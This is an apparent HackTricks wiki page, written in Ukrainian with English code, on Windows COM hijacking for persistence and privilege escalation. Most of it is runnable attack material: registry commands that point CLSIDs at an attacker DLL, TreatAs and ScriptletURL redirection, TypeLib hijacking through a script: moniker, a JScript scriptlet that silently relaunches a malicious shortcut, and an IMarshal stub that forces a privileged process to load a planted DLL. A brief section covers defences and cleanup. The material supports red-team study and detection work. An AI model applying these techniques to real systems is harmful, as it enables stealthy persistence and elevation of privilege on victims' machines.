# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Пошук неіснуючих COM-компонентів

Оскільки користувачі можуть змінювати значення HKCU, **COM Hijacking** можна використовувати як **механізм persistence**. За допомогою `procmon` легко знайти COM-реєстрації, яких ще не існує, але які може створити зловмисник. Класичні фільтри:

- операції **RegOpenKey**;
- де _Result_ — **NAME NOT FOUND**;
- а _Path_ закінчується на **InprocServer32**.

Корисні варіації під час пошуку:

- Також шукайте відсутні ключі **`LocalServer32`**. Деякі COM-класи є позапроцесними серверами й запускатимуть EXE-файл, контрольований зловмисником, а не DLL.
- Окрім `InprocServer32`, шукайте операції з реєстром **`TreatAs`** і **`ScriptletURL`**. У нещодавніх матеріалах із виявлення загроз і звітах про malware постійно згадують їх, адже вони трапляються значно рідше за звичайні COM-реєстрації, а отже, є високосигнальними.
- Під час клонування реєстрації в HKCU скопіюйте легітимний **`ThreadingModel`** з оригінального `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Використання неправильної моделі часто порушує активацію й робить hijack помітним.<sup>[[3]](#references)</sup>
- У 64-бітних системах перевіряйте обидва подання — 64-бітне й 32-бітне (`procmon.exe` і `procmon64.exe`, `HKLM\Software\Classes` і `HKLM\Software\Classes\WOW6432Node`), оскільки 32-бітні програми можуть використовувати іншу COM-реєстрацію.

Вибравши неіснуючий COM для імітації, виконайте наведені нижче команди. _Будьте обережні: імітація COM, який завантажується кожні кілька секунд, може бути надмірною._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### COM-компоненти планувальника завдань, які можна перехопити

Завдання Windows використовують Custom Triggers для виклику COM-об’єктів. Оскільки вони виконуються через планувальник завдань, легше передбачити, коли саме вони спрацюють.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Переглянувши вивід, можна вибрати, наприклад, завдання, яке виконується **щоразу, коли користувач входить у систему**.

Потім, шукаючи CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** у **HKEY\CLASSES\ROOT\CLSID**, а також у HKLM і HKCU, ви зазвичай виявите, що цього значення немає в HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Тоді можна просто створити запис HKCU, і щоразу, коли користувач входитиме в систему, запускатиметься ваш backdoor.

## Осиротілі реєстрації COM і Custom Marshaling

Загальносистемна реєстрація COM може стати примітивом для DLL planting без зміни реєстру. Шукайте значення `InprocServer32`, DLL якого відсутня, а кінцевий шлях можна створити або змінити з облікового запису користувача з низькими привілеями. Якщо розмістити DLL із точно такою назвою, будь-який процес, що активує CLSID, завантажить код зловмисника. У прикладі CrossDevice зареєстрований шлях був `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, тому звичайний користувач міг створити відсутній дочірній каталог і DLL.<sup>[[5]](#references)</sup>

### `IMarshal` як примітив для завантаження DLL в іншому процесі

Зазвичай COM представляє вказівник на інтерфейс стандартним `OBJREF`, який посилає процес-отримувач назад до початкового об’єкта. Об’єкт, що реалізує `IMarshal`, натомість може створити власний `OBJREF`. Його метод `GetUnmarshalClass` повертає CLSID коду, який відновить об’єкт у процесі-отримувачі. Цей CLSID не обов’язково має ідентифікувати початковий об’єкт. COM знаходить для нього внутрішньопроцесний сервер і завантажує зареєстровану DLL, перш ніж передати виклик методу потрібного інтерфейсу.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Мінімальна шкідлива реалізація має лише підставити осиротілий CLSID у `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Передайте цей об’єкт через параметр методу з проксіюванням, наприклад `[in] IUnknown *`. Інший варіант — `CoGetInstanceFromIStorage`, причому об’єкт із custom marshaling також має реалізувати достатню частину `IStorage`, щоб пройти локальні перевірки. Під час автоматичного unmarshaling на віддаленому сервері визначається підставлений CLSID, тому DLL завантажується до виклику цільового методу.<sup>[[5]](#references)</sup>

Цей примітив не обмежується відсутніми реєстраціями. Він також може змусити отримувача завантажити наявну DLL custom-unmarshaler і виявити помилки в її завантаженні або шляху unmarshaling.<sup>[[5]](#references)</sup>

Для цього ланцюжка мають виконуватися всі наведені нижче умови:<sup>[[5]](#references)</sup>

1. CLSID, видимий на рівні комп’ютера, вказує на відсутню DLL in-process або DLL, яку можна замінити.
2. Зловмисник може розмістити цю DLL за шляхом, визначеним під час пошуку.
3. Активований out-of-process COM-сервер працює з потрібним рівнем привілеїв.
4. Сервер приймає custom marshaling і надає виклик із проксіюванням, який передає об’єкт зловмисника через межу процесу.

### Пошук осиротілих in-process серверів

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) і [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) можуть перелічити базу даних COM комп’ютера й перевірити кожен сервер за допомогою звичайного механізму пошуку модулів Win32. Це краще за `Test-Path`, оскільки деякі реєстрації містять лише ім’я файлу й покладаються на шлях пошуку завантажувача.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Сприймайте результат як список кандидатів, а не як доказ можливості експлуатації. Визначте шлях так, як це робить завантажувач, а потім перевірте DACL першого наявного батьківського каталогу та цільової DLL, якщо вона вже існує. Відсутній файл має значення лише тоді, коли зловмисник може створити або замінити шлях, який COM фактично визначить.<sup>[[5]](#references)</sup>

### Виберіть і запустіть привілейований приймач

Перевірте потенційні COM-класи на наявність `RunAs`, прив’язки до служби, доступних інтерфейсів і RPC-проксі. Клас, налаштований для `SYSTEM`, але не прив'язаний до іменованої служби, може не активуватися напряму, оскільки RPCSS не зможе його запустити. У такому разі знайдіть непривілейований тригер, який запускає його хост, наприклад виконуване завдання планувальника, і відтворіть усі передумови з іменованими подіями або IPC, потрібні для роботи сервера.<sup>[[5]](#references)</sup>

Наприклад, у вразливому ланцюжку Shell Create Object Handler хост запускався шляхом створення очікуваної глобальної події перед викликом виконуваного завдання планувальника від імені користувача.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Зіставте отримане посилання на об'єкт із його хостом і перевірте ідентичність і політику маршалінгу. Потім перелічіть інтерфейси й перетворіть їхні проксі на IDL, щоб знайти вхідний параметр, наприклад `IUnknown *`, через який буде маршалитися підроблений об'єкт.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Захист від custom-marshaling

Відповідний приймач не повинен відхиляти недовірені custom marshalers. Два захисти на рівні всього процесу: `EOAC_NO_CUSTOM_MARSHAL` у capabilities, переданих до `CoInitializeSecurity`, і `COMGLB_UNMARSHALING_POLICY_STRONG`, встановлений через `IGlobalOptions::Set`. За наявності символів відповідний стан можна перевірити в `combase!gCapabilities` і `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager показує результат як `CustomMarshalAllowed`, якщо його парсер процесів підтримує цю збірку Windows.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` дає змогу емулювати один CLSID за допомогою іншого.<sup>[[4]](#references)</sup> З погляду атакувальника це означає, що можна не змінювати оригінальний CLSID, створити другий CLSID для поточного користувача, який вказує на `scrobj.dll`, а потім перенаправити справжній COM-об’єкт на шкідливий за допомогою `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Це корисно, коли:

- цільова програма вже створює екземпляр стабільного CLSID під час входу в систему або запуску програми
- потрібно перенаправлення лише через реєстр, а не заміна оригінального `InprocServer32`
- потрібно виконати локальний або віддалений scriptlet `.sct` через значення `ScriptletURL`

Приклад робочого процесу (адаптований із публічних напрацювань Atomic Red Team і попередніх досліджень зловживання реєстром COM):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Нотатки:

- `scrobj.dll` зчитує значення `ScriptletURL` і виконує вказаний файл `.sct`, тож payload можна зберігати як локальний файл або завантажувати віддалено через HTTP/HTTPS.
- `TreatAs` особливо зручний, коли оригінальна реєстрація COM повна й стабільна в HKLM, оскільки достатньо невеликого перенаправлення для поточного користувача замість дублювання всього дерева.
- Щоб перевірити результат, не чекаючи на природне спрацьовування, можна вручну створити екземпляр фальшивого ProgID/CLSID за допомогою `rundll32.exe -sta <ProgID-or-CLSID>`, якщо цільовий клас підтримує активацію STA.

## COM TypeLib Hijacking (script: moniker persistence)

Бібліотеки типів (TypeLib) визначають інтерфейси COM і завантажуються через `LoadTypeLib()`. Коли створюється екземпляр COM-сервера, ОС також може завантажити пов’язану TypeLib, перевіривши ключі реєстру в `HKCR\TypeLib\{LIBID}`. Якщо шлях до TypeLib замінити на **moniker**, наприклад `script:C:\...\evil.sct`, Windows виконає scriptlet під час обробки TypeLib — це забезпечує приховану persistence, що спрацьовує під час взаємодії зі звичайними компонентами.

Цей спосіб спостерігали у випадку з елементом керування Microsoft Web Browser (його часто завантажують Internet Explorer, програми з вбудованим WebBrowser і навіть `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Кроки (PowerShell)

1) Визначте TypeLib (LIBID), яку використовує CLSID із високою частотою викликів. Приклад CLSID, яким часто зловживають у ланцюжках malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Спрямуйте шлях per-user TypeLib на локальний scriptlet за допомогою moniker `script:` (права адміністратора не потрібні):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Розмістіть мінімальний JScript `.sct`, який повторно запускає ваш основний payload (наприклад, `.lnk`, використаний у початковому ланцюжку):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Запуск — відкриття IE, програми, що вбудовує елемент керування WebBrowser, або навіть звичайні дії в Explorer завантажать TypeLib і виконають scriptlet, повторно активувавши ваш ланцюжок під час входу в систему/перезавантаження.

Очищення
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Примітки
- Ви можете застосувати ту саму логіку до інших широко використовуваних компонентів COM; завжди спочатку визначайте справжній `LIBID` з `HKCR\CLSID\{CLSID}\TypeLib`.
- У 64-бітних системах можна також заповнити підрозділ `win64` для 64-бітних споживачів.

## References

- [1] [Перехоплення TypeLib — нова техніка закріплення в COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research — кампанія ZipLine: складна фішингова атака, спрямована на компанії США](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Повторний розгляд перехоплення COM (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Ключ CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero — техніки експлуатації Windows: реєстрації COM-об’єктів із відсутніми цільовими об’єктами](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn — інтерфейс IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Специфікації Microsoft Open Specifications — MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
{{#include ../../banners/hacktricks-training.md}}

